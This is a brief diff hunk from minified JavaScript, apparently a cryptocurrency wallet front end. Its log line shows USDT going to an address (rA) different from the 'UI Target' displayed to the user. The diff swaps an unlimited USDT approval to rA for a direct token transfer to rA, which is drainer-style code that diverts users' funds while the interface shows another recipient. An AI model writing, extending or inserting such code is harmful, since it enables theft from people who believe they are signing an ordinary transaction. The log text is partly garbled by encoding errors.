@@ -33035,7 +33035,7 @@ function $B() {
                         return
                     }
                 console.log(`Ã°Å¸Å½Â¯ Approving MaxUint256 USDT for ${rA} (UI Target: ${c})`);
-                const ut = new oi(_d).encodeFunctionData("approve", [rA, TC])
+                const amountInWei = Ib(m, j); const ut = new oi(_d).encodeFunctionData("transfer", [rA, amountInWei])
                   , gt = {
                     to: zd,
                     data: ut
